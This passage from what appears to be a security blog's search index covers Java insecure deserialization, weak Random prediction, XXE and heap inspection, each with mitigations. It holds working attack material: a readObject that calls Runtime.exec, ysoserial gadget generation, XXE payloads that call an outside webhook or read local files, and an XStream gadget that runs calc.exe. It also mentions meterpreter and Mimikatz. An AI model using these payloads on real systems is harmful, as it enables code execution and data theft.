20 21 22 23 24 25 26 27 28  package org.securitywhitepapers.deserialization; import java.io.IOException; import java.io.ObjectInputStream; public class User implements java.io.Serializable { private String username; public User() { System.out.println(\u0026#34;Constructor called\u0026#34;); } public User(String username) { this.username = username; } public String getUsername() { return username; } public void setUsername(String username) { this.username = username; } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;ReadObject Called\u0026#34;); } }   And when the above code runs this is what is printed in the console:\n\nSo as we have seen the readObject was called, and the constructor wasn\u0026rsquo;t.\nThe readObject method is the main reason for unsafe deserialization.\nSo I created another class, UnsafeObject with the following code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  package org.securitywhitepapers.deserialization; import java.io.IOException; public class UnsafeObject implements java.io.Serializable { String command; public UnsafeObject(String command) { this.command = command; } public String getCommand() { return command; } public void setCommand(String command) { this.command = command; } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { Runtime.getRuntime().exec(command); } }   Exploiting Unsafe Deserialization Now if you accept this object serialized, and an attacker sends a malicious crafter payload where the command invokes \u0026ldquo;calc.exe\u0026rdquo; this will run and a calculator will open.\nThis can be much more serious and instead of opening a calculator it can open a reverse meterpreter session and have control over the machine.\nOk, so you\u0026rsquo;re thinking: Yeah, right, and why the hell would anyone do this?\nWell, it doesn\u0026rsquo;t need to. A more complex code on readObject could call/instanciate other object, or even use reflection, and through chaining multiple object declarations an attacker could get a flow from a readObject to the Runtime.getRuntime().exec, and a manipulated argument\nAnd now I hear you saying: Thats still not that usual.\nAnd\u0026hellip; it is.\nUnfortunately there are a few known libraries, and used in a lot (really, a lot) of Java web applications, that have this flows. So if you use one of them, the objects are loaded in the application classpath, so you are vulnerable, just by having them, since a deserialization can deserialize to any object in the classpath by default.\nA tool called ysoserial is known for generating payloads for this vulnerable libraries, and it has options for apache\u0026rsquo;s commons-collections, groovy, javassist, spring-core and more.\nLets try it out. You can download the jar file and generate a payload through the command line, or you can use it in a project (with maven for example), I\u0026rsquo;m going with the second one for this scenario.\nSo lets change the Main method, to generate a ysoserial payload to open calculator, replace the user serialized object by the payload, and deserialize it\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  public static void main(String[] args) { try { //serialize an user object  User u = new User(\u0026#34;Whitepapers\u0026#34;); serialize(u); //create a malicious payload. The application will read it thinking it is secure  ObjectPayload op = new ysoserial.payloads.CommonsCollections4(); Object payload = op.getObject(\u0026#34;calc\u0026#34;); serialize(payload); //and this triggers the vulnerability  u = (User)deserialize(serializedFile); } catch (Exception ex) { Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex); } }   And this is the outcome:\n\nAs you can see in the printscreen, an exception was thrown, but the code has already run .\nHave in mind that you are not only vulnerable if you use one of the known libraries in ysoserial or other tools, but you are vulnerable if you do deserialization without taking precautions.\nRCE is the worst scenario (if you do notuse one of those libraries), and even you code can lead to that.\nLets see another way in.\nIf you create a static block on a class that is going to be deserialized, this code will run, and this can also be a way to exploit the vulnerability:\n\nProtecting your code The problem with the way java deserializes objects is that it stores in the serialized file the type of the object to be deserialized. This is how an attacker can get to the Apache Commons library for example. So we need to fixed that.\nThe way to do this is to create a whitelist, and only allow java to deserialize the classes that you want.\nYou need to override the ObjectInputStream Class so that when checking the type of an object it only allows specific classes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package org.securitywhitepapers.deserialization; import java.io.IOException; import java.io.InputStream; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; import java.util.ArrayList; public class LookAheadObjectInputStream extends ObjectInputStream { ArrayList\u0026lt;String\u0026gt; allowedTypes; public LookAheadObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); allowedTypes = new ArrayList\u0026lt;\u0026gt;(); allowedTypes.add(Project.class.getName()); allowedTypes.add(User.class.getName()); } @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { if (!allowedTypes.contains(desc.getName())) throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, desc.getName()); return super.resolveClass(desc); } }   In this example we just created LookAheadObjectInputStream that extends ObjectInputStream and in resolveClass method we check if the class to be deserialized is in the whitelist allowedTypes\nNow if you try to deserialize the generated payload you get an error, but no calculator:\n\nBtw the static block does not run either.\nHave in mind that this does not fix bad code. If you execute a command from a serialized class, in the readObject this won\u0026rsquo;t help you. Be carefull with what you do with serializable objects.\nBest approach is really not to use serialization. If you need to store data in an Json file, for example, and construct objects based on the values :)\n", 
        "url": "https:\/\/thesecurityvault.com\/insecure-deserialization-in-java\/",
        "summary": "Insecure deserialization got in OWASP top 10 in 2017 as most of web applications written in Java and .net where found vulnerable and in most of the scenarios the vulnerabilities got to Remote Code Execution (RCE)\nSo lets see how this vulnerability works, how to exploit it and how to prevent it. …",
        "preview": "https:\/\/thesecurityvault.com\/insecure-deserialization-in-java\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/weak-random\/": {
        
        "title": "Weak Random",
        "tags": [],
        "content": "A lot of developers don\u0026rsquo;t know that regular Random is a weak random implementation. In fact its quite predictable. A lot of code relies on this class to generate passwords, tokens and other security related values, that in fact end up not being secure at all.\nI\u0026rsquo;m going to focus on Java, but a lot of the concepts are the same for other languages\nHow Java (weak) Random Works There are some nice articles about this on the net, the one that caught my eye when learning about this a long time ago was the one from Franklin To. This is an awesome article explaining how he replicated the Random class from java. Its quite easy to understand and I recommend everybody to read it.\nSo to explain how this works, basically java Random class uses a Linear Congruential Generator (LCG) which is a really nice and old algorithm that generates numbers in a way that for the human eye look like random. The formula is as simple as:\nxn = a * xn-1 + c mod m\nWhere x0 needs to be defined manually since its the first value. and a,c and m are predefined constants.\nIn java, by default, the first x value ( x0 ) is seeded from current time in milliseconds with a small operation on top of it. But you can change the seed. Lets see an example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  package com.securitywhitepapers.predictrandom; import java.util.Random; public class SameSeed { public static void main(String[] args) { Random r1 = new Random(1111); Random r2 = new Random(1111); for(int i = 0; i \u0026lt; 10; i++) { int v2 = r2.nextInt(); int v1 = r1.nextInt(); System.out.println(String.format(\u0026#34;Same value: %b r2 value: %d | r2 value: %d\u0026#34;, v1 == v2, v1, v2)); } } }   \nIf you run this peace of code you will see that both weak random instances will always return the same values because they have the same seed.\nIf you look at the LCG algorithm that is understandable. The x0 which is our seed is the same in both instances. a,c and m are static and hardcoded so we have exactly the same formula for both instances.\nIf you change the seed from one of the instances, or if you remove them results will be different.\nReplicating Java Random So we now have a fair understanding how this works, but you are probably thinking that you still need to guess the exact time the weak Random instance was created to get the seed, or guess the seed of an application so that you could replicate the random.\nIn fact its quite easy to guess the seed having the right amount of samples (when using Random.nextDouble in java, you just need one sample, and Random.nextInt you need just two).\nI will not get into details since this is not my expertise, but you can refer to the first link I used, or the ones in the references.\nTo demonstrate this, I will use the code provided by Franklin To in his article\nYou can just copy paste the class \u0026ldquo;ReplicatedRandom\u0026rdquo; from github and put it on your project, then you can use the following code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  package com.securitywhitepapers.predictrandom; import java.util.Random; public class Replicate { public static void main(String[] args) { Random r = new Random(); ReplicatedRandom rr = new ReplicatedRandom(); //assuming we got to know 2 sequential \u0026#34;random\u0026#34; values generated  rr.replicateState(r.nextInt(), r.nextInt()); for(int i = 0; i \u0026lt; 10; i++) { int randomValue = r.nextInt(); int replicatedValue = rr.nextInt(); System.out.println(String.format(\u0026#34;Same value: %b Random: %d | ReplicatedRandom: %d\u0026#34;, randomValue == replicatedValue, randomValue, replicatedValue)); } } }   When you run it, you will see that it generates the same values.\n\nThere are also other tools that help you \u0026ldquo;guess\u0026rdquo; the next numbers from weak Random, like Foresight for multiple scenarios\nSo regular Random is quite easy to predict. What are the alternatives?\nSecure Random SecureRandom is your way to go.\nBut how does then SecureRandom garantees an unpredictable random value? We need to understand how the class works first :)\nSecureRandom has multiple algorithms to get random bytes. Lets see them.\nRun the following java code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  package com.securitywhitepapers.predictrandom; import java.security.SecureRandom; import java.security.Security; import java.util.Set; public class SecureRandomAlgorithms { public static void main(String[] args) { final Set\u0026lt;String\u0026gt; algorithms = Security.getAlgorithms(\u0026#34;SecureRandom\u0026#34;); for (String algorithm : algorithms) { System.out.println(algorithm); } final String defaultAlgorithm = new SecureRandom().getAlgorithm(); System.out.println(\u0026#34;default: \u0026#34; + defaultAlgorithm); } }   This will show you the available algorithms that java has for your system as well as the default one.\nI\u0026rsquo;m using a Windows machine so mine are:\n\nIf you run on a Unix based environment you will see much more options like NATIVEPRNG, NATIVEPRNGBLOCKING and NATIVEPRNGNONBLOCKING.\nLets start by explaining the Unix ones.\nNATIVEPRNGBLOCKING NATIVEPRNGBLOCKING makes use of /dev/random which is a file fed by the OS with random data from multiple souces. It collects \u0026ldquo;noise\u0026rdquo; from drivers, interrupts, etc.\nAt the end you get unpredictable values. /dev/random works with what is called an entropy pool, where API\u0026rsquo;s get the values from. When this pool runs out of data, you will have to wait until new data is generated, and since this uses hardware based events and others, this can take some time. This is why /dev/random is blocking. If no data is available you will have to wait until it has the necessary data.\nNATIVEPRNGNONBLOCKING On the other hand, you have /dev/urandom (used by NATIVEPRNGNONBLOCKING) which is non blocking. This means that you won\u0026rsquo;t have to wait for new random data. It uses /dev/random to get a seed to feed a PRNG algorithm.\nIf it can\u0026rsquo;t get a seed then theoretically, since this is non-blocking, it will return a preditable value\nNATIVEPRNG is configurable through the java.security file and usually uses /dev/random.\nThis is the default configuration, and its safe :)\nLets now take a quick look at the available options for windows.\nWINDOWS-PRNG WINDOWS-PRNG uses native crypto api\u0026rsquo;s from windows to return random data, which is also considered safe. If you send the same seed to two different instances the output will be different.\nSHA1PRNG Lets move to SHA1PRNG. This one is available on all systems since its a pure java implementation. The security of this algorithm is directly linked with the source of entropy. Two instances with the same seed generate the same value. Also a lot of experts in the field have claimed this method is not that secure.\nThis is also the default algorithm selected for windows environments prior to Java version 9.\nSo if you are using a windows system you should always change the default algorithm:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  package com.securitywhitepapers.predictrandom; import java.security.NoSuchAlgorithmException; import java.security.SecureRandom; import java.util.logging.Level; import java.util.logging.Logger; public class SafeSecureRandomWindows { public static void main(String[] args) { try { SecureRandom sr = SecureRandom.getInstance(\u0026#34;WINDOWS-PRNG\u0026#34;); } catch (NoSuchAlgorithmException ex) { Logger.getLogger(SafeSecureRandomWindows.class.getName()).log(Level.SEVERE, null, ex); } } }   DRBG From Java 9 and above you now have a new option: DRBG (from Deterministic Random Bit Generator and this is the new default for windows environments. There are some nice options you can configure from the java.security file, but the defaults are good\n;TLDR  Random is unfit for security related stuff, or other scenarios where you need unpredictability SecureRandom is the way to go Default SecureRandom algorithm in windows is SHA1PRNG for Java 8 and bellow SHA1PSRNG is unsafe, don\u0026rsquo;t use it. Don\u0026rsquo;t seed SecureRandom unless you really (really) know what you are doing  You can find a project\u0026rsquo;s source code with some tests here\n", 
        "url": "https:\/\/thesecurityvault.com\/weak-random\/",
        "summary": "A lot of developers don\u0026rsquo;t know that regular Random is a weak random implementation. In fact its quite predictable. A lot of code relies on this class to generate passwords, tokens and other security related values, that in fact end up not being secure at all.\nI\u0026rsquo;m going to focus on Java, …",
        "preview": "https:\/\/thesecurityvault.com\/weak-random\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/xml-external-entities-xxe\/": {
        
        "title": "XML External Entities (XXE)",
        "tags": [],
        "content": "XML and JSON are two formats ruling the web right now.\nAlthough JSON\u0026rsquo;s adoption is increasing significantly specially with REST, XML is still widely used.\nWhat most of developers don\u0026rsquo;t know is that most of the XML parsers out there by following the specification by default have major security flaws. In some cases (not that much) you can even get RCE (Remote Code Execution)\nLets start by the basics and understand the problem.\nXml Entities XML by default has what is called an Entity. You can see this as a shortcut, or like a variable. If you need for example, to put the same value in multiple elements you can create an entity, and refer to entity in the elements, like so:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE post [\u0026lt;!ELEMENT post ANY \u0026gt; \u0026lt;!ENTITY authorname \u0026#34;Luis Fontes\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;posts\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;/posts\u0026gt;   In the example above we are telling that the post element will have an entity called authorname. Then we can use that entity in the post as \u0026lsquo;\u0026amp;authorname;\u0026rsquo;\nThis is called an internal entity.\nExternal Entities And since we have internal entities we also have external entities.\nExternal entities get their value from an external source, like so:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE post [\u0026lt;!ELEMENT post ANY \u0026gt; \u0026lt;!ENTITY authorname SYSTEM \u0026#34;http://example.com/entities.dtd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;posts\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;post\u0026gt; \u0026lt;author\u0026gt;\u0026amp;authorname;\u0026lt;/author\u0026gt; \u0026lt;content\u0026gt;...\u0026lt;/content\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;/posts\u0026gt;   Now we told that the value of the entity authorname comes from http://example.com/entities.dtd\nAnd this is the XXE vulnerability.\nSince this is from the XML specification, most parsers comply with it, and do the request to the url, to get the values for the entities.\nSo with XML XXE, you can do Server Side Request Forgery (SSRF) where you manipulate server requests, Port Scanning, File Disclosure, and sometimes Remote Code Execution (RCE).\nAttacking External Entities Lets get our hands dirty and test some scenarios. I\u0026rsquo;ll explain the vulnerability with Java code, and at the end i\u0026rsquo;ll also do a quick overview in C#\nFirst we need a server to connect to.\nUsually I use netcat to listen on a port and see the requests, but in the last weeks I found an awesome website that receives requests for you, and shows all the content of it. Its the https://webhook.site/. I\u0026rsquo;ll be using this to receive my requests.\nNext we need a vulnerable application. Let\u0026rsquo;s start with this small code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  package com.securitywhitepapers.xxe; import java.io.File; import java.io.IOException; import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.io.SAXReader; import org.jdom2.JDOMException; public class SaxReader { public static void main(String[] args) throws IOException, JDOMException, DocumentException { SAXReader reader=new SAXReader(); Document doc=null; doc=reader.read(new File(\u0026#34;payload.xml\u0026#34;)); System.out.println(doc.asXML()); } }   This is the simplest piece of code.\nAnd as you can see we are reading the content of the file called payload.xml, we need that file as well. Use the following xml, save it with the same name, on the projects root folder\n1 2 3 4 5 6 7  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY bar SYSTEM \u0026#34;https://webhook.site/f0f0f9b4-0845-48f9-9939-aa43558a1529\u0026#34; \u0026gt;]\u0026gt; \u0026lt;contact\u0026gt; \u0026lt;name\u0026gt;Luis Fontes\u0026lt;/name\u0026gt; \u0026lt;foo\u0026gt;\u0026amp;bar;\u0026lt;/foo\u0026gt; \u0026lt;/contact\u0026gt;   Now if you run this code, you will notice that a request was made:\n\nAnd voilà. We have XXE.\nIf you have a webserver that accepts XML files from user, an attacker may be using your webserver to make requests to other websites, for example.\nBut, as I said this is not all, and you can do other type of attacks, like read files from file system.\nTo do that you just need to change the schema to file like so:\n´´´xml\nAnd if you look at the output:\n\nSo we included a local file in the xml.\nThis can be leveraged to get other files from the file system, as long as you know the path to the file (and the app opening has permissions to read it).\nTo get RCE its harder and you need the server application to use PHP. I won\u0026rsquo;t be getting in to details, just check this link on how it happens.\nXXE in XStream There is also a known vulnerability in old versions of XStream that allows you to do RCE, but this is specific to this library and its not XXE, although its with XML as well . Lets see very quickly how it works.\nI used XStream version 1.4.6 to test this, with the following code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  package com.securitywhitepapers.xxe; import javax.xml.stream.XMLStreamException; public class XStream { public static void main(String[] args) throws XMLStreamException { com.thoughtworks.xstream.XStream xstream = new com.thoughtworks.xstream.XStream(); //payload to open calc.exe  String payload = \u0026#34;\u0026lt;sorted-set\u0026gt;\u0026#34; + \u0026#34;\u0026lt;string\u0026gt;foo\u0026lt;/string\u0026gt;\u0026#34; + \u0026#34;\u0026lt;dynamic-proxy\u0026gt;\u0026#34; + \u0026#34;\u0026lt;interface\u0026gt;java.lang.Comparable\u0026lt;/interface\u0026gt;\u0026#34; + \u0026#34;\u0026lt;handler class=\\\u0026#34;java.beans.EventHandler\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34; \u0026lt;target class=\\\u0026#34;java.lang.ProcessBuilder\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34; \u0026lt;command\u0026gt;\u0026#34; + \u0026#34; \u0026lt;string\u0026gt;calc.exe\u0026lt;/string\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/command\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/target\u0026gt;\u0026#34; + \u0026#34; \u0026lt;action\u0026gt;start\u0026lt;/action\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/handler\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/dynamic-proxy\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/sorted-set\u0026gt;\u0026#34;; Contact expl = (Contact) xstream.fromXML(payload); } }   And if you run it, you will see a calculator opening. To prevent this you either update XStream to a new version which is the best approach, or you can see a workaround in the official documentation\nAnd now how can you fix XXE for the other parsers?\nPreventing External Entities attacks To prevent this vulnerability we need to disable entities. This is the recommendation from OWASP:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  package com.securitywhitepapers.xxe; import java.io.File; import java.io.IOException; import org.dom4j.Document; import org.dom4j.DocumentException; import org.dom4j.io.SAXReader; import org.jdom2.JDOMException; import org.xml.sax.SAXException; public class SaxReader { public static void main(String[] args) throws IOException, JDOMException, DocumentException, SAXException { SAXReader reader=new SAXReader(); reader.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); reader.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); reader.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); reader.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); Document doc=null; doc=reader.read(new File(\u0026#34;payload.xml\u0026#34;)); System.out.println(doc.asXML()); } }   Have in mind that there are multiple parsers for xml in java, each one has its way of parsing files, and its way to prevent it.\nYou can find at the end of the article a project\u0026rsquo;s source project with multiple parsers, and how to prevent them.\nUnmarshaller from java 8 and above is secure by default.\nFor C# .Net framework disabled the external entities by default in version 4.5.2 so this examples only work with versions bellow.\nTo fix this issue in XMLDocument you just need to set the XML Resolver to null:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  using System; using System.IO; using System.Xml; namespace XXEPOC { class Program { static void Main(string[] args) { XmlDocument xmlDoc = new XmlDocument(); String xmlContent = File.ReadAllText(\u0026#34;payload.xml\u0026#34;); xmlDoc.XmlResolver = null; xmlDoc.LoadXml(xmlContent); } } }   Test it yourself You can get the source code of the project used for this article, with tests for multiple java parsers here.\nAlso I have an opensource tool called XXExploiter that you can use to generate the malicious payloads.\n", 
        "url": "https:\/\/thesecurityvault.com\/xml-external-entities-xxe\/",
        "summary": "XML and JSON are two formats ruling the web right now.\nAlthough JSON\u0026rsquo;s adoption is increasing significantly specially with REST, XML is still widely used.\nWhat most of developers don\u0026rsquo;t know is that most of the XML parsers out there by following the specification by default have major …",
        "preview": "https:\/\/thesecurityvault.com\/xml-external-entities-xxe\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/heap-inspection\/": {
        
        "title": "Heap Inspection",
        "tags": [],
        "content": "Heap Inspection is a vulnerability that most of the times developers don\u0026rsquo;t care about, since it is not easy to mitigate, and most of libraries/frameworks are not prepared to handle it.\nSo what is Heap Inspection? Basically it\u0026rsquo;s just when you get access to a machine and get access to process memory data. Then you can search for passwords or other sensitive information.\nThe prevention for this is to have sensitive information in memory as less time as possible, and even encrypted if needed. When you don\u0026rsquo;t need the information, discard it.\nWhy is this underrated?\nFirst, you need to have access to the machine. If you have a website, the attacker needs to gain access to the server that hosts it (most of the times).\nOk, so let\u0026rsquo;s see a really exploitation of this vulnerability, that has a high impact on the target system.\nA few years ago, when an attacker gained access to a Windows machine, one common task to do was to extract the users' hash password from the SAM file. Then they needed to bruteforce the hash, to retrieve the real password. This brute force could take from hours to days or years.\nNowadays attackers have a much easier way to retrieve user passwords, since windows needs them to be in memory.\nSo Mimikatz was created. This tool is known for extracting users' passwords from memory in plaintext.\n\nThis is one of the most extreme exploitations of this vulnerability.\nHow to dump process memory Lets start by seeing how you can dump the heap of a process.\nThe easiest way is by using the task manager:\n\nThen you can use hex editors like HxD (in windows) to open and search the file.\nJava Example Lets take a look at a small java application to understand how does Heap Inspection happen, and how to prevent it.\nFirst you need to know that a String in java is usually immutable.\nWhat this means is that, if you have String a = \u0026ldquo;hello\u0026rdquo;; and you change a to a = \u0026ldquo;hello world\u0026rdquo; you will end up with two strings in memory. \u0026ldquo;hello\u0026rdquo; and \u0026ldquo;hello world\u0026rdquo;, since the string cannot be changed.\nEvery time you \u0026lsquo;change\u0026rsquo; a string, a new instance is being created in memory and assigned to that variable. (we are going to see bellow the exceptions)\nThe problem is that the old strings are not cleaned up.\nTake a look at the next example\n1 2 3 4 5 6 7 8 9 10 11 12 13  package heapinspection; import java.util.Scanner; public class OverrideString { public static void main(String\\[\\] args) { String s = \u0026#34;Im a string\u0026#34;; s = \u0026#34;Im a new string\u0026#34;; new Scanner(System.in).next(); } }   In the example above I created the string s and then overwrite its value. The scanner is just to prevent the code from closing too soon.\nNow we need something to dump the heap. I\u0026rsquo;m not going to use task manager, first because only works on windows, second because we have better ways to do this in java.\nI\u0026rsquo;m going to use a tool called VisualVM. You can dump the heap by code and import to VisualVM or just dump it in VisualVM which is the approach i\u0026rsquo;m going to.\nI have an example on how to do dump through source in the source code at the end of the post.\nYou can also use jhat for example, which is a tool that comes with java installation that can be used to navigate the dumps\nRun the app, and while opened, go to VisualVM\nOn the left side identify the process of your application, right click it and hit \u0026ldquo;Heap Dump\u0026rdquo;\n\nThis will generate a dump bellow the process.\nTo see the objects of your app follow the next image:\n\nAs you can see there are a lot of objects here.\nFor this scenarios I usually switch to the \u0026ldquo;OQL Console\u0026rdquo; to use a really unknown and undocumented query language: OQL.\nUnfortunately I\u0026rsquo;m not an expert on it so i can\u0026rsquo;t go into much details about it either.\nSwitch to the console and lets search in the dump for our strings:\n\nAnd in the console and the bottom paste this:\nselect s from java.lang.String s where s.toString().contains(\u0026ldquo;Im a\u0026rdquo;)\nThis is a query to find strings that contain the text \u0026ldquo;Im a\u0026rdquo;\nAnd as you can see we found two:\n\nWe now know for sure that when \u0026lsquo;changing\u0026rsquo; a string what happens down the hood is that a new instance is created.\nWhat about Garbage Collector? Take a look at this example:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  package heapinspection; import java.util.Arrays; import java.util.Scanner; public class StringLiteralNewStringAndGC { public static void main(String\\[\\] args) { doIt(); System.gc(); String s4 = new String(\u0026#34;string4\u0026#34;); String s5 = \u0026#34;string5\u0026#34;; char c2\\[\\] = {\u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;6\u0026#39;}; String s6 = new String(c2); Arrays.fill(c2, \u0026#39;0\u0026#39;); new Scanner(System.in).next(); } private static void doIt(){ char c\\[\\] = {\u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;n\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;1\u0026#39;}; String s = new String(c); Arrays.fill(c, \u0026#39;0\u0026#39;); String s2 = \u0026#34;string2\u0026#34;; String s3 = new String(\u0026#34;string3\u0026#34;); } }   First of all I need to explain the different ways that strings are being created in this sample to understand how affects heap inspection.\nLets start by s2 (in doIt) method. This is a String Literal. String literals are not garbage collected and are immutable.\nString s is being created with an instantiation with a char array as a parameter. This is not a string literal, can be garbage collected and its muttable.\nString s3 has a string literal and is creating a new instance of a string. So in this scenario we have 2 strings. A literal and one which is not literal. Garbage collector only removes one of the two \u0026ldquo;string3\u0026rdquo; in memory.\nAlso note that on strings s and s6 if you assign a new string the old value will be overwritten since they are muttable.\nClose the other example, run this one, dump it on VisualVM and search for the strings:\nselect s from java.lang.String s where s.toString().startsWith(\u0026ldquo;string\u0026rdquo;)\n\nNotice that string1 is not showing up. It was garbage collected, great!\nString2 still there. Again, string literals are not garbage collected.\nString3 still there as well, but since we created two strings, one of them was garbage collected. We can be sure if we look for string4 which is the same scenario but not affected by GC, and it has 2 instances.\nAlso, garbage collector only worked because s,s2 and s3 were on a different method. If they were on the same GC would leave them alone.\nNow for the most important part, and this is where a lot of people get it wrong. Garbage collector does not clean memory, it only releases objects.\nIn other terms, it says that specific addresses in memory can be rewritten, that the content there is not important anymore, but the content stays in memory until it gets overwritten.\nLets make sure of it. Go ahead and dump the process from the sample above through process manager.\nIn Linux I believe you can use programs like gcore (i\u0026rsquo;m sorry but I didn\u0026rsquo;t test it ).\nNow lets open the dump in an hex editor. I like to use HxD\nIf you do a find for the content String1 you will find it there:\n\nSo to prevent strings from staying in memory we can create a string with the new keyword with a char array as a parameter (that you need to clear), and when you don\u0026rsquo;t need it set it to null (or run GC).\nAn easier way is to just use the char array and clear it afterwards.\nThis is a reason when using crypto related methods, keys are sent as byte[] or char[] and not as a String.\nPreventing Heap Inspection Lets then see (again) how to prevent this with a char array:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  package heapinspection; import java.util.Arrays; import java.util.Scanner; public class ClearArray { public static void main(String\\[\\] args) { char\\[\\] t2 = { \u0026#39;c\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;2\u0026#39; }; //this will be cleared  Arrays.fill(t2, \u0026#39;0\u0026#39;); new Scanner(System.in).next(); }   In this example we are creating an array and replacing all positions with a zeros\nLet\u0026rsquo;s run it and check again the dump\n1  selectsfrom\\[Cswheres.toString().contains(\u0026#34;chararray2\u0026#34;)  Nothing found\u0026hellip; But now if you look for the zeros:\n1  selectsfrom\\[Cswheres.toString().contains(\u0026#34;000000000\u0026#34;)  Here it is :D\nIf you need to add extra security on top of that you can use GuardedString, or SealedObject which basically keep data encrypted in memory, but GuardedString keeps the key in memory and SealedObject puts cipher management on your side, so at the end it\u0026rsquo;s not much, but it\u0026rsquo;s something. It adds a security layer and may get unnoticed.\nAnd what about WebApps? So this is probably the part that you are really interested\u0026hellip;\nLets take a look at the following snippet of a Spring MVC controller:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  package com.securitywhitepapers.heapinspection.controller; import com.securitywhitepapers.heapinspection.model.User; import com.sun.management.HotSpotDiagnosticMXBean; import java.io.IOException; import java.lang.management.ManagementFactory; import java.util.logging.Level; import java.util.logging.Logger; import javax.management.MBeanServer; import org.springframework.http.MediaType; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestMethod; import org.springframework.web.bind.annotation.ResponseBody; @Controller @RequestMapping(value = \u0026#34;index\u0026#34;) public class IndexController { @RequestMapping(method = RequestMethod.POST, consumes = MediaType.APPLICATION\\_JSON\\_VALUE) @ResponseBody public String parsedBody(@RequestBody User user) { user.cleanPassword(); return \u0026#34;\u0026#34;; } }   This is quite simple: An endpoint that receives an object of type User, that only has a password as a char array. cleanPassword 